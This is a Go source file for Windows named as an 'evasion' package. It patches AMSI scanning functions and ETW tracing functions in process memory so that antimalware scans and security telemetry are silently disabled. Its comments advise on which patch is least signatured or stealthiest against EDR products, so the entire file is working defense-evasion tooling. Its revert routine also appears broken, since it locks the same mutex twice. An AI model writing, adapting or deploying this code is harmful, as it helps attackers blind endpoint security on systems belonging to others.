//go:build windows

package evasion

import (
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

var (
	aeAmsiDLL  = syscall.NewLazyDLL("amsi.dll")
	aeNtdllDLL = syscall.NewLazyDLL("ntdll.dll")
	aeKernel32 = syscall.NewLazyDLL("kernel32.dll")

	// AMSI.
	procAmsiScanBuffer  = aeAmsiDLL.NewProc("AmsiScanBuffer")
	procAmsiScanString  = aeAmsiDLL.NewProc("AmsiScanString")
	procAmsiInitialize  = aeAmsiDLL.NewProc("AmsiInitialize")
	procAmsiOpenSession = aeAmsiDLL.NewProc("AmsiOpenSession")

	// ETW
	procEtwEventWrite         = aeNtdllDLL.NewProc("EtwEventWrite")
	procEtwEventWriteFull     = aeNtdllDLL.NewProc("EtwEventWriteFull")
	procEtwEventWriteEx       = aeNtdllDLL.NewProc("EtwEventWriteEx")
	procEtwEventWriteString   = aeNtdllDLL.NewProc("EtwEventWriteString")
	procEtwEventWriteTransfer = aeNtdllDLL.NewProc("EtwEventWriteTransfer")
	procNtTraceEvent          = aeNtdllDLL.NewProc("NtTraceEvent")

	// Memory helpers
	procVirtualProtect        = aeKernel32.NewProc("VirtualProtect")
	procFlushInstructionCache = aeKernel32.NewProc("FlushInstructionCache")
	procGetCurrentProcess     = aeKernel32.NewProc("GetCurrentProcess")
	procGetModuleHandleW      = aeKernel32.NewProc("GetModuleHandleW")
)

type AMSIMethod int

const (
	// AMSIProEINVAL overwrites the AmsiScanBuffer prologue to
	// return E_INVALIDARG. Works with PowerShell and .NET.
	// Heavily signatured — use only if the target is known to
	// lack a memory-integrity sensor.
	AMSIProEINVAL AMSIMethod = iota

	// AMSIAltEntry patches AmsiScanString instead. Same effect for
	// callers that use the string entry point. Less signatured
	// because it is not the classic target.
	AMSIAltEntry

	// AMSIInitFail patches AmsiInitialize to return a failure
	// HRESULT. The caller treats this as "AMSI unavailable" and
	// proceeds without scanning. Stealthiest of the three because
	// it is a one-shot patch at startup and the modified function
	// is not the one EDRs typically map.
	AMSIInitFail

	// AMSIBoth applies ProEINVAL to AmsiScanBuffer *and* InitFail
	// to AmsiInitialize. Belt and braces for a target whose EDR
	// hooking is unknown.
	AMSIBoth
)

// ETWMethod selects which set of functions is targeted.
type ETWMethod int

const (
	// ETWRet writes a single 0xC3 (ret) over EtwEventWrite's first
	// byte. Classic, trivially detected by any EDR that maps
	// ntdll.dll against a known-good copy.
	ETWRet ETWMethod = iota

	// ETWAll patches EtwEventWrite, EtwEventWriteFull,
	// EtwEventWriteEx, EtwEventWriteString, and
	// EtwEventWriteTransfer. Covers every provider path.
	ETWAll

	// ETWSyscall patches NtTraceEvent in ntdll — the syscall every
	// EtwEventWrite* function ultimately invokes. One patch covers
	// everything, at the cost of also disabling ETW consumers
	// inside the process (profiler, some AV sensors). Prefer this
	// when the target's EDR is known not to depend on in-process
	// ETW callbacks.
	ETWSyscall
)

// Patch byte sequences.
var (
	// Classic AMSI patch: return E_INVALIDARG.
	//   mov eax, 0x80070057 ; ret
	amsiPatchEINVAL = []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	// AmsiInitialize failure patch: return E_FAIL (0x80004005).
	// Callers treat any non-S_OK as "AMSI unavailable" and skip
	// scanning.
	//   mov eax, 0x80004005 ; ret
	amsiPatchInitFail = []byte{0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3}

	// Single-byte ret, for ETW.
	etwRetPatch = []byte{0xC3}
)

// Windows memory protection constants.
const (
	pageExecuteReadWrite = 0x40
)

var (
	patchMu      sync.Mutex
	savedPatches = map[uintptr][]byte{}
)

func writeBytes(addr uintptr, patch []byte) error {
	if len(patch) == 0 {
		return nil
	}

	patchMu.Lock()
	if _, ok := savedPatches[addr]; !ok {
		orig := make([]byte, len(patch))
		for i := range patch {
			orig[i] = *(*byte)(unsafe.Pointer(addr + uintptr(i)))
		}
		savedPatches[addr] = orig
	}
	patchMu.Unlock()

	var oldProtect uint32
	r, _, errno := procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		pageExecuteReadWrite,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r == 0 {
		return fmt.Errorf("VirtualProtect: %w", errno)
	}

	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	var unused uint32
	procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&unused)),
	)

	hProc, _, _ := procGetCurrentProcess.Call()
	procFlushInstructionCache.Call(
		hProc, addr, uintptr(len(patch)))
	return nil
}

func safeAddr(proc *syscall.LazyProc) (uintptr, error) {
	if err := proc.Find(); err != nil {
		return 0, err
	}
	return proc.Addr(), nil
}

func moduleLoaded(name string) bool {
	namePtr, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return false
	}
	h, _, _ := procGetModuleHandleW.Call(
		uintptr(unsafe.Pointer(namePtr)))
	return h != 0
}

func patchSingle(name string, proc *syscall.LazyProc, patch []byte) error {
	addr, err := safeAddr(proc)
	if err != nil {
		return fmt.Errorf("%s: %w", name, err)
	}
	if addr == 0 {
		return fmt.Errorf("%s: null address", name)
	}
	if err := writeBytes(addr, patch); err != nil {
		return fmt.Errorf("patch %s: %w", name, err)
	}
	return nil
}

func PatchAMSI() error {
	return PatchAMSIWithMethod(AMSIProEINVAL)
}

func PatchAMSIWithMethod(method AMSIMethod) error {
	if !moduleLoaded("amsi.dll") {
		return nil
	}

	switch method {
	case AMSIProEINVAL:
		return patchSingle(
			"AmsiScanBuffer", procAmsiScanBuffer, amsiPatchEINVAL)

	case AMSIAltEntry:
		return patchSingle(
			"AmsiScanString", procAmsiScanString, amsiPatchEINVAL)

	case AMSIInitFail:
		return patchSingle(
			"AmsiInitialize", procAmsiInitialize, amsiPatchInitFail)

	case AMSIBoth:
		var errs []string
		if err := patchSingle(
			"AmsiScanBuffer", procAmsiScanBuffer,
			amsiPatchEINVAL); err != nil {
			errs = append(errs, err.Error())
		}
		if err := patchSingle(
			"AmsiInitialize", procAmsiInitialize,
			amsiPatchInitFail); err != nil {
			errs = append(errs, err.Error())
		}
		if len(errs) > 0 {
			return fmt.Errorf("amsi: %s",
				strings.Join(errs, "; "))
		}
		return nil
	}

	return fmt.Errorf("amsi: unknown method %d", method)
}

func PatchETW() error {
	return PatchETWWithMethod(ETWRet)
}

func PatchETWWithMethod(method ETWMethod) error {
	switch method {
	case ETWRet:
		return patchSingle(
			"EtwEventWrite", procEtwEventWrite, etwRetPatch)

	case ETWAll:
		targets := []struct {
			name string
			proc *syscall.LazyProc
		}{
			{"EtwEventWrite", procEtwEventWrite},
			{"EtwEventWriteFull", procEtwEventWriteFull},
			{"EtwEventWriteEx", procEtwEventWriteEx},
			{"EtwEventWriteString", procEtwEventWriteString},
			{"EtwEventWriteTransfer", procEtwEventWriteTransfer},
		}

		var (
			errs    []string
			patched int
		)
		for _, t := range targets {
			addr, err := safeAddr(t.proc)
			if err != nil {
				continue
			}
			if err := writeBytes(addr, etwRetPatch); err != nil {
				errs = append(errs,
					fmt.Sprintf("%s: %v", t.name, err))
				continue
			}
			patched++
		}
		if patched == 0 {
			return fmt.Errorf(
				"etw: no functions patched (errors: %s)",
				strings.Join(errs, "; "))
		}
		if len(errs) > 0 {
			return fmt.Errorf(
				"etw: patched %d of %d, errors: %s",
				patched, len(targets),
				strings.Join(errs, "; "))
		}
		return nil

	case ETWSyscall:
		return patchSingle(
			"NtTraceEvent", procNtTraceEvent, etwRetPatch)
	}

	return fmt.Errorf("etw: unknown method %d", method)
}

func RevertWindowsEvasion() error {
	patchMu.Lock()
	defer patchMu.Unlock()

	var errs []string
	for addr, orig := range savedPatches {
		if err := writeBytes(addr, orig); err != nil {
			errs = append(errs,
				fmt.Sprintf("0x%x: %v", addr, err))
			continue
		}
		delete(savedPatches, addr)
	}
	if len(errs) > 0 {
		return fmt.Errorf("revert: %s", strings.Join(errs, "; "))
	}
	return nil
}

func ApplyWindowsEvasion(amsi, etw bool) error {
	var errs []error
	if amsi {
		if err := PatchAMSIWithMethod(AMSIBoth); err != nil {
			errs = append(errs, err)
		}
	}
	if etw {
		if err := PatchETWWithMethod(ETWAll); err != nil {
			errs = append(errs, err)
		}
	}
	if len(errs) == 0 {
		return nil
	}
	return fmt.Errorf("evasion: %v", errs)
}